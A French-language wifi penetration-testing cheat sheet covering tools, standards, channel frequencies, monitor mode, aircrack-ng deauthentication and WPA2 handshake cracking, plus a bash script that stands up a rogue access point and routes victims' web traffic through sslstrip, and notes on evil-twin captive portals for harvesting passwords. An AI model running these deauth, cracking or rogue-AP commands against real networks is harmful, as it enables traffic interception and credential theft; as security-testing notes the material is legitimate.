# Wifi basics

## Tools

* [Aircrack-ng](https://www.aircrack-ng.org/downloads.html)

* [Acrylic Wifi](https://www.acrylicwifi.com/)

* [Kismet](https://www.kismetwireless.net/)

* [WiFi Pineapple](https://shop.hak5.org/collections/wifi-pentesting)

* [Alfa Card Drivers](https://files.alfa.com.tw/)

* [Wireshark](https://www.wireshark.org/)

* [HackRF](https://greatscottgadgets.com/hackrf/one/)


## Definitions

| Terme      | Signification |
|------------|----------------|
| AP         | Access Point   |
| ESSID      | Extended Service Set Identifier (Identifiant de Service Étendu) |
| BSSID      | Basic Service Set Identifier (Identifiant de Service de Base) |
| SSID       | Service Set Identifier (Identifiant de Service) |
| Channels   | Peut fonctionner de 1 à 14, et aux États-Unis de 1 à 11 |
| Power      | Distance par rapport au signal |
| Security   | WEP, WPA1, WPA2, WPA3 |
| Modes      | Managed, Master, Master |
| Frequency  | 2.4GHz ou 5GHz |


## Modulation

ASK, FSK, PSK
OFDM : Orthogonal Frequency Division Multiplexing
DSSS : Direct-Sequence Spread Spectrum
FHSS : Frequency Hopping Spread Spectrum

## Cryptographie

| Normes | Authent | Algorithmes | IV (bits) | Clé (bits) |
|-------|------|-------------|--|--|
| WEP (obsolète) || RC4 | 24 | 40..104 |
| WPA  (obsolète)| RC4 TKIP | 48 | 128 |
| WPA2 | PSK | AES-CCMP | 48 | 128 |
| WPA2 entreprise | 802.1X/EAP | AES CCMP |||
| WPA3 | SAE+FS/PFS | AES-CCMP/AES-GCMP | 48 | 128..256 |
| WPA3 entreprise | 802.1X/EAP | GCMP | AES |||

> Attention à WPA3-personal, censé renforcer WPA2, certaines vulnérabilités sont connues via le protocole SAE. (ex : CertID VU871675, CVE-2019-9494, CVE-2019-9494, CertID VU871675)

## Standards

| Standard     | Fréquence    | Débit maximal théorique | Portée maximale | Année d'introduction |
|--------------|--------------|-------------------------|-----------------|----------------------|
| IEEE 802.11  | 2.4 GHz      | 2 Mbps                  | ~20 m           | 1997                 |
| IEEE 802.11a | 5 GHz        | 54 Mbps                 | ~35 m           | 1999                 |
| IEEE 802.11b | 2.4 GHz      | 11 Mbps                 | ~35 m           | 1999                 |
| IEEE 802.11g | 2.4 GHz      | 54 Mbps                 | ~38 m           | 2003                 |
| IEEE 802.11n | 2.4 GHz / 5 GHz | 600 Mbps           | ~70 m           | 2009                 |
| IEEE 802.11ac| 5 GHz        | 1.3 Gbps                | ~70 m           | 2013                 |
| IEEE 802.11ad| 60 GHz       | 7 Gbps                  | ~10 m           | 2012                 |
| IEEE 802.11ax| 2.4 GHz / 5 GHz / 6 GHz | 10 Gbps    | ~300 m (outdoor)| 2019                 |
| IEEE 802.11ay| 60 GHz       | 20 Gbps                 | ~300 m (outdoor)| 2021                 |
| IEEE 802.11be| 2.4 GHz / 5 GHz / 6 GHz | 23 Gbps    | ~300 m (outdoor)| 2024                 |


## Canaux

Connaitre le lien canal-fréquence permet d'utiliser des outils software defined radio (SDR) en complément des cartes wifi. Cela permet de détecter et trianguler les points d'accès malveillants.

| Freq | nb | pas |
|------|--------------|-----|
| 2.4 GHz | 13 (14 au Japon) | 5 MHz |
| 5 GHz | 22 | 20 MHz |

### valeurs



| id | Freq (GHz) |
|----|------|
| 1 | 2.412 |
| 2 | 2.417 |
| 3 | 2.422 |
| 4 | 2.427 |
| 5 | 2.432 |
| 6 | 2.437 |
| 7 | 2.442 |
| 8 | 2.447 |
| 9 | 2.452 |
| 10 | 2.457 |
| 11 | 2.462 |
| 12 | 2.467 |
| 13 | 2.472 |
| 14 | 2.484 |
| 32    | 5.160  |
| 36    | 5.180  |
| 40    | 5.200  |
| 44    | 5.220  |
| 48    | 5.240  |
| 52    | 5.260  |
| 56    | 5.280  |
| 60    | 5.300  |
| 64    | 5.320  |
| 68    | 5.340  |
| 96    | 5.480  |
|100    | 5.500  |
|104    | 5.520  |
|108    | 5.540  |
|112    | 5.560  |
|116    | 5.580  |
|120    | 5.600  |
|124    | 5.620  |
|128    | 5.640  |
|132    | 5.660  |
|136    | 5.680  |
|140    | 5.700  |

> 6GHz : interdit en France

## Le mode monitor

Permets la capture et l'analyse du trafic wifi


### Linux

Activer le mode `monitor`, (la carte wifi doit être compatible)

```sh
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

anciens Linux :

```sh
ifconfig wlan0 down
iwconfig wlan0 mode monitor
fconfig wlan0 up
```

Debug en cas d'utilisation de la carte qui empêche le passe en mode monitor : 

```sh
nmcli nm wifi off
sudo rfkill unblock all
```

Pour fixer la puissance d'émission :

```sh
iw wlan0 set txpower fixed 3000
```

### Windows

```batch
netsh wlan show interfaces
```

* [Npcap](https://npcap.com/#download)

Le binaire se trouve dans `C:\Windows\System32\Npcap`

```powershell
.\WlanHelper.exe "wi-fi" mode monitor
```

à défaut d'une carte et de drivers compatibles, il faudra se contenter d'une énumération sommaire 

> se déconnecter de son AP wifi pour lister l'ensemble des réseaux

```batch
netsh wlan show networks
netsh wlan show networks mode=bssid
netsh wlan show networks mode=ssid
```

lister les profils de la machine :

```batch
netsh wlan show profiles
netsh wlan show profiles name=<SSID>
```


## Kismet

Supporte à la fois les `cartes wifi monitorables` et les materiels `SDR` comme le HackRF one.



## Aicrack-ng 

### Hidden AP

* Le mode `monitor` permet de sniffer l'ensemble du trafic (pas uniquement les beacons) et de détecter les wifi "cachés". On peut ensuite utiliser `airodump`

* *Alternative pour redescendre sur les couches basses* : on peut aussi procéder par analyse de spectre et antenne directionnelle pour trouver la source d'émission. cf. HackRF.

### capture quick and dirty

`airodump-ng wlan0mon`

### capture dans un fichier :

Cette méthode offre notamment la possibilité de capturer les handshakes WPA2 en vue d'une attaque par force brute. 

```sh
airodump-ng --essid <nom AP> -c <channel> -w capture-file wlan1
airodump-ng --bssid <mac AP> -c <channel> -w capture-file wlan1
```

### deauth (broadcast):

```sh
sudo aireplay-ng --deauth 30 -a <mac AP> wlan1
```

### deauth ciblée:

```sh
sudo aireplay-ng --deauth 30 -a <mac AP> -c <mac Client> wlan1
```

### brute force d'un handshake capturé

```sh
aircrack-ng.exe -w wordlist.txt file.cap
```

### Script pour un rogue access point

```sh
function AP1 {

	#creation d'un Access Point
	echo -e "/!\ KALI MUST BE SET IN AIRPLANE MODE/WIFI DISABLED BEFORE.\nthe nat configuration of iptables is not flush for do that: iptables -t nat -D PREROUTING 1 "
	echo -e "syntax: AP1 <bssid/mac> <essid/APname> <canal> <iface>"
	ifconfig $4 down
	iwconfig $4 mode monitor
	rfkill unblock wlan
	airbase-ng -a $1 -c $3 --essid $2 $4 
}
export -f AP1

function AP2 {

	#creation d'un access point + acces internet
	echo -e "syntax: AP2 <bssid/mac> <essid/APname> <canal> <Wifi-Iface> <redirection-iface>"
	#creation de l'ap en arriere plan:
	AP1 $1 $2 $3 $4 &
	echo "please wait 10..."
	sleep 10
	#flush d'iptable et redirection de port:
	iptables -F && iptables -X
	iptables -P FORWARD ACCEPT
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -t nat -A POSTROUTING -o $5 -j MASQUERADE
	#kernel fowarding
	echo 1 > /proc/sys/net/ipv4/ip_forward
	
	#configuration du rogue AP: puissance, ip, routage DHCP
	iwconfig wlan0 txpower 30
	ifconfig at0 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
	
	echo -e "default-lease-time 600;\nmax-lease-time 7200;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\nrange 10.0.0.10 10.0.0.15;\noption subnet-mask 255.255.255.0;\noption broadcast-address 10.0.0.255;\noption routers 10.0.0.1;\noption domain-name-servers 8.8.8.8;\noption domain-name \"local\";\n}" > /etc/dhcp/dhcpd.conf

	echo -e "INTERFACESv4=\"at0\"\nINTERFACESv6=\"\"" > /etc/default/isc-dhcp-server 
	service isc-dhcp-server restart
	echo "Enjoy!"
}
export -f AP2

function AP3 {

        #creation d'un access point + acces internet + proxy
        echo -e "syntax: AP3 <bssid/mac> <essid/APname> <canal> <Wifi-Iface> <redirection-iface>"
        #creation de l'ap en arriere plan:
        AP1 $1 $2 $3 $4 &
	echo "lease wait 10..."
        sleep 10
        #flush d'iptable et redirection de port:
        iptables -F && iptables -X
        iptables -P FORWARD ACCEPT
        iptables -P INPUT ACCEPT
        iptables -P OUTPUT ACCEPT
        iptables -t nat -A POSTROUTING -o $5 -j MASQUERADE
        #kernel fowarding
        echo 1 > /proc/sys/net/ipv4/ip_forward

        #configuration du rogue AP: puissance, ip, routage DHCP
        iwconfig wlan0 txpower 30
        ifconfig at0 10.0.0.1 netmask 255.255.255.0
        route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

        echo -e "default-lease-time 600;\nmax-lease-time 7200;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\nrange 10.0.0.10 10.0.0.15;\noption subnet-mask 255.255.255.0;\noption broadcast-address 10.0.0.255;\noption routers 10.0.0.1;\noption domain-name-servers 8.8.8.8;\noption domain-name \"local\";\n}" > /etc/dhcp/dhcpd.conf

        echo -e "INTERFACESv4=\"at0\"\nINTERFACESv6=\"\"" > /etc/default/isc-dhcp-server
        service isc-dhcp-server restart
	
	#mise en place du prooxy:
        iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
        iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
        #Attaque par desauthentification:
        aireplay-ng -0 15 -a $1 $4
        sslstrip standard:
        sslstrip -l 10000 -w ./sslstrip_log    
        sslstrip2/Leonardo
        /root/Documents/Projets/RogueAP/sslstrip2-master/sslstrip.py -l 10000 -w ./leonardo.log
# }
export -f AP3

function ap { AP2 00:01:C7:4E:15:0D $1 6 $2 $3 ; }
export -f ap
function rogue { AP3 00:01:C7:4E:15:0D $1 6 $2 $3 ; } 
export -f rogue
```


## Antenne Wifi directionnelle

À partir d'une boite de conserve.

1. le - du câble est connecté à la boite de conserve
2. le + est isolé et dépasse au milieu de la boite

```txt
H: 100 mm 
L: 175 mm
___________________________________________
|
|
|
|
|           |
| <44 mm>   |   Picot + de 31 mm
|__________ | _____________________________
           ||
           -+
           || câble ant.


```


## PINEAPPLE MARK VII

une fois branché: `http://172.16.42.1:1471/#/Login`

default passwd: hak5pineapple

### Principales attaques

* Deauth
* Rogue AP / Evil Twin (Clone)
* Captures Handshakes
* MITM

### Campagnes

Possibilités de faire des campagnes de différents types pour tester le niveau de sécurité

### Evil Twin

possibilité de faire:

* un bruteforce des half handshake capturé
* un portail captif pour récupérer les mots de passe